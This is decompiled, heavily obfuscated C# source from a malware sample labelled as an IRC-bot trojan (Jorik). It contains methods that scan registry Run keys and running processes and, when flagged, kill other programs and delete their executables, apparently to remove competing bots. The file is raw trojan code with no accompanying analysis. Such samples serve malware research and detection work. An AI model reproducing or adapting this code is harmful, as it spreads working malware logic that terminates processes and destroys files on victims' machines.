// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Refx, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0A6501CE-651B-49EF-9CD4-6837233ABDB4
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan.Win32.Jorik.IRCbot.div-738c3979666da85c3c9872a05697e6bff01b107645b92c3a808be0f2a7bf41a4.exe

using \u0003;
using \u0005;
using \u007F;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Collections;
using System.Runtime.CompilerServices;

namespace \u007F
{
  internal sealed class \u0083
  {
    [NonSerialized]
    internal static \u0002 \u0001;

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static int \u009B(bool KillBot = false)
    {
      int num;
      try
      {
        num = 0;
        RegistryKey registryKey1 = \u0096.\u007E\u0005\u0004((object) Registry.CurrentUser, \u0083.\u0001(1221));
        string[] strArray1 = \u008C\u0002.\u007E\u0006\u0004((object) registryKey1);
        int index1 = 0;
        while (index1 < strArray1.Length)
        {
          string str1 = strArray1[index1];
          IEnumerator enumerator;
          if (\u0081\u0002.\u007E\u0087\u0002((object) \u0086\u0002.\u007E\u001A\u0002(\u0004\u0002.\u007E\u0007\u0004((object) registryKey1, str1)), \u009E\u0002.\u0094(\u0083.\u0001(1286))))
          {
            try
            {
              enumerator = \u0016\u0003.\u007E\u001D\u0002((object) (IEnumerable) \u008F\u0002.\u008B(\u001C\u0002.\u0096(\u0083.\u0001(1299), (string) null), (Type) null, \u0083.\u0001(1312), new object[1]
              {
                (object) \u0083.\u0001(1325)
              }, (string[]) null, (Type[]) null, (bool[]) null));
              while (\u0091.\u007E\u001F\u0002((object) enumerator))
              {
                object obj1 = \u001C\u0003.\u007F\u0004(\u001C\u0003.\u007E\u007F\u0002((object) enumerator));
                if (\u0081\u0002.\u007E\u0087\u0002((object) \u0086\u0002.\u007E\u001A\u0002(\u008F\u0002.\u008B(obj1, (Type) null, \u0083.\u0001(1362), new object[0], (string[]) null, (Type[]) null, (bool[]) null)), \u0014\u0003.\u007E\u0089\u0002((object) \u0086\u0002.\u007E\u001A\u0002(\u0004\u0002.\u007E\u0007\u0004((object) registryKey1, str1)), \u0083.\u0001(1383), \u0083.\u0001(131))))
                {
                  \u001A\u0002 obj2 = \u001A\u0002.\u008D;
                  \u008F\u0002 obj3 = \u008F\u0002.\u008B;
                  // ISSUE: type reference
                  Type type = \u001E\u0003.\u0011\u0003(__typeref (Strings));
                  string str2 = \u0083.\u0001(1388);
                  object[] objArray1 = new object[1];
                  object[] objArray2 = objArray1;
                  object obj4 = obj1;
                  object obj5 = \u001C\u0003.\u007F\u0004(\u008F\u0002.\u008B(obj4, (Type) null, \u0083.\u0001(1362), new object[0], (string[]) null, (Type[]) null, (bool[]) null));
                  objArray2[0] = obj5;
                  object[] objArray3 = objArray1;
                  object[] objArray4 = objArray3;
                  bool[] flagArray1 = new bool[1]{ true };
                  bool[] flagArray2 = flagArray1;
                  object obj6 = obj3((object) null, type, str2, objArray4, (string[]) null, (Type[]) null, flagArray2);
                  if (flagArray1[0])
                    \u001D\u0003.\u008C(obj4, (Type) null, \u0083.\u0001(1362), new object[1]
                    {
                      \u001C\u0003.\u007F\u0004(objArray3[0])
                    }, (string[]) null, (Type[]) null, true, false);
                  string str3 = \u009E\u0002.\u0001\u0002(\u008C.\u0002);
                  if (!obj2(obj6, (object) str3, false))
                  {
                    if (KillBot)
                    {
                      \u0011\u0002.\u007E\u009C\u0004((object) \u0094\u0002.\u0099\u0004(\u0094.\u0081(\u008F\u0002.\u008B(obj1, (Type) null, \u0083.\u0001(1397), new object[0], (string[]) null, (Type[]) null, (bool[]) null))));
                      \u0005\u0003.\u001A(\u0086\u0002.\u0088(\u008F\u0002.\u008B(obj1, (Type) null, \u0083.\u0001(1362), new object[0], (string[]) null, (Type[]) null, (bool[]) null)), FileAttribute.Normal);
                      \u0012\u0002.\u001B\u0003(1000);
                      \u0084\u0002.\u0019(\u0086\u0002.\u0088(\u008F\u0002.\u008B(obj1, (Type) null, \u0083.\u0001(1362), new object[0], (string[]) null, (Type[]) null, (bool[]) null)));
                    }
                    checked { ++num; }
                  }
                }
              }
            }
            finally
            {
              if (enumerator is IDisposable)
                \u0011\u0002.\u007E\u0080\u0002((object) (enumerator as IDisposable));
            }
          }
          checked { ++index1; }
        }
        RegistryKey registryKey2 = \u0096.\u007E\u0005\u0004((object) Registry.LocalMachine, \u0083.\u0001(1221));
        string[] strArray2 = \u008C\u0002.\u007E\u0006\u0004((object) registryKey2);
        int index2 = 0;
        while (index2 < strArray2.Length)
        {
          string str4 = strArray2[index2];
          IEnumerator enumerator;
          if (\u0081\u0002.\u007E\u0087\u0002((object) \u0086\u0002.\u007E\u001A\u0002(\u0004\u0002.\u007E\u0007\u0004((object) registryKey2, str4)), \u009E\u0002.\u0094(\u0083.\u0001(1286))))
          {
            try
            {
              enumerator = \u0016\u0003.\u007E\u001D\u0002((object) (IEnumerable) \u008F\u0002.\u008B(\u001C\u0002.\u0096(\u0083.\u0001(1299), (string) null), (Type) null, \u0083.\u0001(1312), new object[1]
              {
                (object) \u0083.\u0001(1325)
              }, (string[]) null, (Type[]) null, (bool[]) null));
              while (\u0091.\u007E\u001F\u0002((object) enumerator))
              {
                object obj7 = \u001C\u0003.\u007F\u0004(\u001C\u0003.\u007E\u007F\u0002((object) enumerator));
                if (\u0081\u0002.\u007E\u0087\u0002((object) \u0086\u0002.\u007E\u001A\u0002(\u008F\u0002.\u008B(obj7, (Type) null, \u0083.\u0001(1362), new object[0], (string[]) null, (Type[]) null, (bool[]) null)), \u0014\u0003.\u007E\u0089\u0002((object) \u0086\u0002.\u007E\u001A\u0002(\u0004\u0002.\u007E\u0007\u0004((object) registryKey2, str4)), \u0083.\u0001(1383), \u0083.\u0001(131))))
                {
                  \u001A\u0002 obj8 = \u001A\u0002.\u008D;
                  \u008F\u0002 obj9 = \u008F\u0002.\u008B;
                  // ISSUE: type reference
                  Type type = \u001E\u0003.\u0011\u0003(__typeref (Strings));
                  string str5 = \u0083.\u0001(1388);
                  object[] objArray5 = new object[1];
                  object[] objArray6 = objArray5;
                  object obj10 = obj7;
                  object obj11 = \u001C\u0003.\u007F\u0004(\u008F\u0002.\u008B(obj10, (Type) null, \u0083.\u0001(1362), new object[0], (string[]) null, (Type[]) null, (bool[]) null));
                  objArray6[0] = obj11;
                  object[] objArray7 = objArray5;
                  object[] objArray8 = objArray7;
                  bool[] flagArray3 = new bool[1]{ true };
                  bool[] flagArray4 = flagArray3;
                  object obj12 = obj9((object) null, type, str5, objArray8, (string[]) null, (Type[]) null, flagArray4);
                  if (flagArray3[0])
                    \u001D\u0003.\u008C(obj10, (Type) null, \u0083.\u0001(1362), new object[1]
                    {
                      \u001C\u0003.\u007F\u0004(objArray7[0])
                    }, (string[]) null, (Type[]) null, true, false);
                  string str6 = \u009E\u0002.\u0001\u0002(\u008C.\u0002);
                  if (!obj8(obj12, (object) str6, false))
                  {
                    if (KillBot)
                    {
                      \u0011\u0002.\u007E\u009C\u0004((object) \u0094\u0002.\u0099\u0004(\u0094.\u0081(\u008F\u0002.\u008B(obj7, (Type) null, \u0083.\u0001(1397), new object[0], (string[]) null, (Type[]) null, (bool[]) null))));
                      \u0005\u0003.\u001A(\u0086\u0002.\u0088(\u008F\u0002.\u008B(obj7, (Type) null, \u0083.\u0001(1362), new object[0], (string[]) null, (Type[]) null, (bool[]) null)), FileAttribute.Normal);
                      \u0012\u0002.\u001B\u0003(1000);
                      \u0084\u0002.\u0019(\u0086\u0002.\u0088(\u008F\u0002.\u008B(obj7, (Type) null, \u0083.\u0001(1362), new object[0], (string[]) null, (Type[]) null, (bool[]) null)));
                    }
                    checked { ++num; }
                  }
                }
              }
            }
            finally
            {
              if (enumerator is IDisposable)
                \u0011\u0002.\u007E\u0080\u0002((object) (enumerator as IDisposable));
            }
          }
          checked { ++index2; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        num = 0;
        \u0012\u0003.\u0090();
      }
      return num;
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static int \u009C(bool RemoveDetected = false)
    {
      int num;
      try
      {
        num = 0;
        IEnumerator enumerator;
        try
        {
          enumerator = \u0016\u0003.\u007E\u001D\u0002((object) (IEnumerable) \u008F\u0002.\u008B(\u001C\u0002.\u0096(\u0083.\u0001(1299), (string) null), (Type) null, \u0083.\u0001(1312), new object[1]
          {
            (object) \u0083.\u0001(1325)
          }, (string[]) null, (Type[]) null, (bool[]) null));
          while (\u0091.\u007E\u001F\u0002((object) enumerator))
          {
            object obj1 = \u001C\u0003.\u007F\u0004(\u001C\u0003.\u007E\u007F\u0002((object) enumerator));
            if (\u0081\u0002.\u007E\u0087\u0002((object) \u0086\u0002.\u007E\u001A\u0002(\u008F\u0002.\u008B(obj1, (Type) null, \u0083.\u0001(1362), new object[0], (string[]) null, (Type[]) null, (bool[]) null)), \u009E\u0002.\u0094(\u0083.\u0001(1286))))
            {
              \u001A\u0002 obj2 = \u001A\u0002.\u008D;
              \u008F\u0002 obj3 = \u008F\u0002.\u008B;
              // ISSUE: type reference
              Type type = \u001E\u0003.\u0011\u0003(__typeref (Strings));
              string str1 = \u0083.\u0001(1388);
              object[] objArray1 = new object[1];
              object[] objArray2 = objArray1;
              object obj4 = obj1;
              object obj5 = \u001C\u0003.\u007F\u0004(\u008F\u0002.\u008B(obj4, (Type) null, \u0083.\u0001(1362), new object[0], (string[]) null, (Type[]) null, (bool[]) null));
              objArray2[0] = obj5;
              object[] objArray3 = objArray1;
              object[] objArray4 = objArray3;
              bool[] flagArray1 = new bool[1]{ true };
              bool[] flagArray2 = flagArray1;
              object obj6 = obj3((object) null, type, str1, objArray4, (string[]) null, (Type[]) null, flagArray2);
              if (flagArray1[0])
                \u001D\u0003.\u008C(obj4, (Type) null, \u0083.\u0001(1362), new object[1]
                {
                  \u001C\u0003.\u007F\u0004(objArray3[0])
                }, (string[]) null, (Type[]) null, true, false);
              string str2 = \u009E\u0002.\u0001\u0002(\u008C.\u0002);
              if (!obj2(obj6, (object) str2, false))
              {
                if (RemoveDetected)
                {
                  \u0011\u0002.\u007E\u009C\u0004((object) \u0094\u0002.\u0099\u0004(\u0094.\u0081(\u008F\u0002.\u008B(obj1, (Type) null, \u0083.\u0001(1397), new object[0], (string[]) null, (Type[]) null, (bool[]) null))));
                  \u0005\u0003.\u001A(\u0086\u0002.\u0088(\u008F\u0002.\u008B(obj1, (Type) null, \u0083.\u0001(1362), new object[0], (string[]) null, (Type[]) null, (bool[]) null)), FileAttribute.Normal);
                  \u0012\u0002.\u001B\u0003(1000);
                  \u0084\u0002.\u0019(\u0086\u0002.\u0088(\u008F\u0002.\u008B(obj1, (Type) null, \u0083.\u0001(1362), new object[0], (string[]) null, (Type[]) null, (bool[]) null)));
                }
                checked { ++num; }
              }
            }
          }
        }
        finally
        {
          if (enumerator is IDisposable)
            \u0011\u0002.\u007E\u0080\u0002((object) (enumerator as IDisposable));
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        num = 0;
        \u0012\u0003.\u0090();
      }
      return num;
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static int \u009D(bool KillBot = false)
    {
      int num;
      try
      {
        num = 0;
        for (string str = \u0002\u0002.\u0017(\u008B\u0003.\u008A\u0002(\u009E\u0002.\u0094(\u0083.\u0001(1286)), \u0083.\u0001(1410)), FileAttribute.ReadOnly | FileAttribute.Hidden | FileAttribute.System); \u0008\u0002.\u009B(str) != 0; str = \u008D\u0003.\u0016())
        {
          if (KillBot && \u008A\u0003.\u008E(\u0089\u0003.\u008B\u0002(\u009E\u0002.\u0094(\u0083.\u0001(1286)), \u0083.\u0001(742), str), \u008C.\u0002, false) != 0)
          {
            \u0005\u0003.\u001A(\u0089\u0003.\u008B\u0002(\u009E\u0002.\u0094(\u0083.\u0001(1286)), \u0083.\u0001(742), str), FileAttribute.Normal);
            \u0012\u0002.\u001B\u0003(1000);
            \u0084\u0002.\u0019(\u0089\u0003.\u008B\u0002(\u009E\u0002.\u0094(\u0083.\u0001(1286)), \u0083.\u0001(742), str));
          }
          if (\u008A\u0003.\u008E(\u0089\u0003.\u008B\u0002(\u009E\u0002.\u0094(\u0083.\u0001(1286)), \u0083.\u0001(742), str), \u008C.\u0002, false) != 0)
            checked { ++num; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        num = 0;
        \u0012\u0003.\u0090();
      }
      return num;
    }

    static \u0083() => \u0004.\u008E();
  }
}
